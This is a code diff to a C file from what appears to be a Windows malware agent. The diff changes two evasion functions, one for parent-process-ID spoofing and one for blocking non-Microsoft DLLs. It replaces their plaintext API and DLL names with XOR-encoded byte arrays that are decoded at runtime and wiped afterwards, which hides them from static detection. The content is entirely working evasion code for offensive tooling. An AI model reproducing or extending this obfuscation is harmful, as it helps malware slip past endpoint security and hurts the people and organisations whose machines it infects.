@@ -7,6 +7,7 @@
  */
 #include "agent.h"
 #include "evasion.h"
+#include "api_resolve.h"
 
 /* ─── PROC_THREAD_ATTRIBUTE constants (MinGW may not define these) ─── */
 
@@ -48,15 +49,29 @@ BOOL evasion_create_process_ppid_spoof(
     BOOL block_dlls,
     PROCESS_INFORMATION *pi_out)
 {
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    char _sk[] = {'k'^0x5A,'e'^0x5A,'r'^0x5A,'n'^0x5A,'e'^0x5A,'l'^0x5A,'3'^0x5A,'2'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sk[_i];_i++) _sk[_i]^=0x5A;
+    HMODULE hK32 = GetModuleHandleA(_sk);
+    SecureZeroMemory(_sk, sizeof(_sk));
     if (!hK32) return FALSE;
 
+    char _si[] = {'I'^0x5A,'n'^0x5A,'i'^0x5A,'t'^0x5A,'i'^0x5A,'a'^0x5A,'l'^0x5A,'i'^0x5A,'z'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,'L'^0x5A,'i'^0x5A,'s'^0x5A,'t'^0x5A,0};
+    for(int _i=0;_si[_i];_i++) _si[_i]^=0x5A;
     pInitializeProcThreadAttributeList pInit =
-        (pInitializeProcThreadAttributeList)GetProcAddress(hK32, "InitializeProcThreadAttributeList");
+        (pInitializeProcThreadAttributeList)GetProcAddress(hK32, _si);
+    SecureZeroMemory(_si, sizeof(_si));
+
+    char _su[] = {'U'^0x5A,'p'^0x5A,'d'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,0};
+    for(int _i=0;_su[_i];_i++) _su[_i]^=0x5A;
     pUpdateProcThreadAttribute pUpdate =
-        (pUpdateProcThreadAttribute)GetProcAddress(hK32, "UpdateProcThreadAttribute");
+        (pUpdateProcThreadAttribute)GetProcAddress(hK32, _su);
+    SecureZeroMemory(_su, sizeof(_su));
+
+    char _sd[] = {'D'^0x5A,'e'^0x5A,'l'^0x5A,'e'^0x5A,'t'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,'L'^0x5A,'i'^0x5A,'s'^0x5A,'t'^0x5A,0};
+    for(int _i=0;_sd[_i];_i++) _sd[_i]^=0x5A;
     pDeleteProcThreadAttributeList pDelete =
-        (pDeleteProcThreadAttributeList)GetProcAddress(hK32, "DeleteProcThreadAttributeList");
+        (pDeleteProcThreadAttributeList)GetProcAddress(hK32, _sd);
+    SecureZeroMemory(_sd, sizeof(_sd));
 
     if (!pInit || !pUpdate || !pDelete)
         return FALSE;
@@ -143,15 +158,29 @@ BOOL evasion_create_process_blockdlls(
     const wchar_t *command_line,
     PROCESS_INFORMATION *pi_out)
 {
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    char _sk2[] = {'k'^0x5A,'e'^0x5A,'r'^0x5A,'n'^0x5A,'e'^0x5A,'l'^0x5A,'3'^0x5A,'2'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
+    for(int _i=0;_sk2[_i];_i++) _sk2[_i]^=0x5A;
+    HMODULE hK32 = GetModuleHandleA(_sk2);
+    SecureZeroMemory(_sk2, sizeof(_sk2));
     if (!hK32) return FALSE;
 
+    char _si2[] = {'I'^0x5A,'n'^0x5A,'i'^0x5A,'t'^0x5A,'i'^0x5A,'a'^0x5A,'l'^0x5A,'i'^0x5A,'z'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,'L'^0x5A,'i'^0x5A,'s'^0x5A,'t'^0x5A,0};
+    for(int _i=0;_si2[_i];_i++) _si2[_i]^=0x5A;
     pInitializeProcThreadAttributeList pInit =
-        (pInitializeProcThreadAttributeList)GetProcAddress(hK32, "InitializeProcThreadAttributeList");
+        (pInitializeProcThreadAttributeList)GetProcAddress(hK32, _si2);
+    SecureZeroMemory(_si2, sizeof(_si2));
+
+    char _su2[] = {'U'^0x5A,'p'^0x5A,'d'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,0};
+    for(int _i=0;_su2[_i];_i++) _su2[_i]^=0x5A;
     pUpdateProcThreadAttribute pUpdate =
-        (pUpdateProcThreadAttribute)GetProcAddress(hK32, "UpdateProcThreadAttribute");
+        (pUpdateProcThreadAttribute)GetProcAddress(hK32, _su2);
+    SecureZeroMemory(_su2, sizeof(_su2));
+
+    char _sd2[] = {'D'^0x5A,'e'^0x5A,'l'^0x5A,'e'^0x5A,'t'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,'L'^0x5A,'i'^0x5A,'s'^0x5A,'t'^0x5A,0};
+    for(int _i=0;_sd2[_i];_i++) _sd2[_i]^=0x5A;
     pDeleteProcThreadAttributeList pDelete =
-        (pDeleteProcThreadAttributeList)GetProcAddress(hK32, "DeleteProcThreadAttributeList");
+        (pDeleteProcThreadAttributeList)GetProcAddress(hK32, _sd2);
+    SecureZeroMemory(_sd2, sizeof(_sd2));
 
     if (!pInit || !pUpdate || !pDelete)
         return FALSE;
